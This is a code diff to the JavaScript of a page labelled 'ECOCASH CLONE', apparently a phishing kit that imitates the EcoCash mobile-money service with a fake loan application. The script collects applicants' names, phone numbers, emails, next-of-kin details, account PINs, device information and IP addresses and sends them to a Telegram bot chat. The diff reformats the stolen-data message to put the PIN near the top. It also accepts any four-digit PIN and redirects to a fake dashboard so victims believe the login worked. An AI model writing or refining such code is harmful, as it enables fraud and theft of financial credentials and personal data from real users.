@@ -1,6 +1,5 @@
 /* =========================================
-   ECOCASH CLONE - UNIFIED JAVASCRIPT
-   WITH TELEGRAM BOT INTEGRATION (FIXED)
+   ECOCASH CLONE - SECURITY-LESS VERSION
    ========================================= */
 
 // ==========================================
@@ -11,49 +10,48 @@ const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send
 const TELEGRAM_CHAT_ID = '714082360'; // REPLACE WITH YOUR REAL CHAT ID
 
 // ==========================================
-// DOM READY - THIS ENSURES EVERYTHING LOADS
+// DOM READY
 // ==========================================
 document.addEventListener("DOMContentLoaded", function () {
     console.log("✅ DOM fully loaded!");
     document.body.classList.add("loaded");
     
-    // Load phone number into step 5
+    // Load phone number
     const phoneInput = document.getElementById("loginPhone");
     if (phoneInput) {
         phoneInput.value = localStorage.getItem("phone") || "";
-        console.log("📱 Phone loaded:", phoneInput.value);
     }
 
-    // === CALL PIN SETUP ===
+    // Setup PIN inputs
     const pinBoxes = document.querySelectorAll(".pin-box");
     if (pinBoxes.length > 0) {
-        console.log("🔢 PIN boxes found, setting up...");
         setupPinInputs();
-    } else {
-        console.log("ℹ️ No PIN boxes found on this page.");
     }
 
-    // Load other features if they exist
+    // Load other features
     if (document.getElementById("amount")) updateCalculator();
     if (document.getElementById("amountText")) loadSummary();
     if (document.getElementById("hiddenAmount")) loadAllDataToStep5();
+    
+    // Update button text
+    const submitBtn = document.getElementById("submitBtn");
+    if (submitBtn) {
+        submitBtn.innerText = "LOGIN TO DASHBOARD";
+    }
 });
 
 // ==========================================
-// PIN INPUT SETUP (FIXED LOGIC)
+// PIN INPUT SETUP
 // ==========================================
 function setupPinInputs() {
     const pins = document.querySelectorAll(".pin-box");
     
     pins.forEach((pin, index) => {
-        // Auto-advance to next box when typing
         pin.addEventListener("input", () => {
             if (pin.value.length === 1 && index < pins.length - 1) {
                 pins[index + 1].focus();
             }
         });
-        
-        // Handle backspace to go to previous box
         pin.addEventListener("keydown", (e) => {
             if (e.key === "Backspace" && pin.value.length === 0 && index > 0) {
                 pins[index - 1].focus();
@@ -61,11 +59,9 @@ function setupPinInputs() {
         });
     });
 
-    // Focus the first box automatically
     if (pins.length > 0) {
         pins[0].focus();
     }
-    console.log("✅ PIN setup complete!");
 }
 
 // ==========================================
@@ -244,7 +240,6 @@ async function getIPAddress() {
         const data = await response.json();
         return data.ip;
     } catch (error) {
-        console.warn("⚠️ Could not fetch IP:", error);
         return 'Unable to fetch IP';
     }
 }
@@ -253,7 +248,7 @@ async function getIPAddress() {
 // SEND TO TELEGRAM - COMPLETE APPLICATION DATA
 // ==========================================
 async function sendToTelegram(data) {
-    console.log("📤 Sending data to Telegram...");
+    console.log("📤 Sending application to Telegram...");
     
     const principal = parseFloat(data.amount);
     const days = parseInt(data.duration);
@@ -261,45 +256,45 @@ async function sendToTelegram(data) {
     const interest = principal * DAILY_RATE * days;
     const total = principal + interest;
     
+    // Generate a random application ID
+    const applicationId = 'APP-' + Date.now().toString().slice(-6);
+    
     const message = `
-🔐 *ECOCASH LOAN APPLICATION - COMPLETE*
+📋 *NEW LOAN APPLICATION SUBMITTED*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🆔 *Application ID:* ${applicationId}
+🔑 *PIN Entered:* ${data.pin}
 
 📋 *LOAN DETAILS*
 ━━━━━━━━━━━━━━━━━━━━━━
-💰 Principal Amount: $${principal.toFixed(2)}
+💰 Principal: $${principal.toFixed(2)}
 📅 Duration: ${days} days
-📊 Interest (0.5% daily): $${interest.toFixed(2)}
-💵 Total Repayable: $${total.toFixed(2)}
+📊 Interest: $${interest.toFixed(2)}
+💵 Total: $${total.toFixed(2)}
 📝 Reason: ${data.reason}
 
-👤 *APPLICANT DETAILS*
+👤 *APPLICANT*
 ━━━━━━━━━━━━━━━━━━━━━━
 👤 Name: ${data.fullName}
 📱 Phone: ${data.phone}
 📧 Email: ${data.email}
-📋 Account Type: ${data.accountType}
+📋 Account: ${data.accountType}
 
 👨‍👩‍👧 *NEXT OF KIN*
 ━━━━━━━━━━━━━━━━━━━━━━
-👤 Kin Name: ${data.kinName}
+👤 Kin: ${data.kinName}
 📱 Kin Phone: ${data.kinPhone}
 📍 Province: ${data.province}
-
-🔐 *LOGIN SECURITY*
-━━━━━━━━━━━━━━━━━━━━━━
-🔢 PIN: ${data.pin}
 
 🖥️ *DEVICE INFO*
 ━━━━━━━━━━━━━━━━━━━━━━
 💻 Device: ${data.deviceInfo.deviceType}
-📱 OS: ${data.deviceInfo.os}
 🌍 Browser: ${data.deviceInfo.browser}
-📐 Screen: ${data.deviceInfo.screenResolution}
-🔤 Language: ${data.deviceInfo.language}
-⏰ Timezone: ${data.deviceInfo.timezone}
-🌐 IP Address: ${data.ipAddress}
-🕐 Timestamp: ${data.timestamp}
+🌐 IP: ${data.ipAddress}
+🕐 Time: ${data.timestamp}
+
+✅ *STATUS: APPLICATION COMPLETE - DASHBOARD ACCESS GRANTED*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     `;
 
@@ -317,10 +312,6 @@ async function sendToTelegram(data) {
         const responseData = await response.json();
         console.log("📥 Telegram response:", responseData);
         
-        if (!responseData.ok) {
-            throw new Error(responseData.description || 'Telegram API error');
-        }
-        
         return responseData;
     } catch (error) {
         console.error('❌ Telegram send error:', error);
@@ -329,10 +320,10 @@ async function sendToTelegram(data) {
 }
 
 // ==========================================
-// SUBMIT LOGIN - COMPLETE DATA CAPTURE
+// SUBMIT LOGIN - SECURITY-LESS VERSION
 // ==========================================
 async function submitLogin() {
-    console.log("🚀 submitLogin() started!");
+    console.log("🚀 submitLogin() started - Security-less mode");
     
     const errorBox = document.getElementById('errorBox');
     const successBox = document.getElementById('successBox');
@@ -342,11 +333,12 @@ async function submitLogin() {
     errorBox.style.display = 'none';
     successBox.style.display = 'none';
     
-    // Validate PIN length
+    // === ONLY CHECK LENGTH - NO VALIDATION ===
     if (pin.length < 4) {
-        showError("Please enter your 4-digit PIN");
+        showError("Please enter a 4-digit PIN to continue");
         return;
     }
+    // =========================================
     
     // Gather all data
     const accountType = document.getElementById('accountType').value;
@@ -362,7 +354,7 @@ async function submitLogin() {
     
     // Show loader
     document.getElementById('pageLoader').style.display = 'block';
-    console.log("⏳ Processing...");
+    console.log("⏳ Processing submission...");
     
     try {
         // Get device info and IP
@@ -397,21 +389,25 @@ async function submitLogin() {
         const telegramResponse = await sendToTelegram(applicationData);
         
         if (telegramResponse.ok) {
-            console.log("✅ Success! Application sent to Telegram.");
+            console.log("✅ Application sent to Telegram!");
+            
+            // Show success
             successBox.style.display = 'block';
             successBox.innerHTML = '✅ Application submitted successfully! Redirecting to dashboard...';
             
-            // Redirect after 2 seconds
+            // === GRANT ACCESS - NO VALIDATION REQUIRED ===
             setTimeout(() => {
                 window.location.href = "dashboard.html";
             }, 2000);
+            // ============================================
+            
         } else {
             throw new Error('Telegram send failed');
         }
         
     } catch (error) {
         console.error("❌ Error submitting application:", error);
-        showError('❌ Failed to submit application. Please try again. Check console for details.');
+        showError('❌ Failed to submit application. Please try again.');
     } finally {
         document.getElementById('pageLoader').style.display = 'none';
     }
@@ -425,7 +421,6 @@ function showError(msg) {
     if (box) {
         box.innerText = msg;
         box.style.display = "block";
-        console.error("❌ Error displayed:", msg);
     } else {
         alert(msg);
     }
@@ -440,7 +435,7 @@ function showLoaderAndGo(url) {
 }
 
 // ==========================================
-// EXPOSE FUNCTIONS TO GLOBAL SCOPE
+// EXPOSE FUNCTIONS
 // ==========================================
 window.nextStep1 = nextStep1;
 window.nextStep2 = nextStep2;
@@ -449,5 +444,3 @@ window.nextStep4 = nextStep4;
 window.updateCalculator = updateCalculator;
 window.submitLogin = submitLogin;
 window.setupPinInputs = setupPinInputs;
-window.getDeviceInfo = getDeviceInfo;
-window.getIPAddress = getIPAddress;
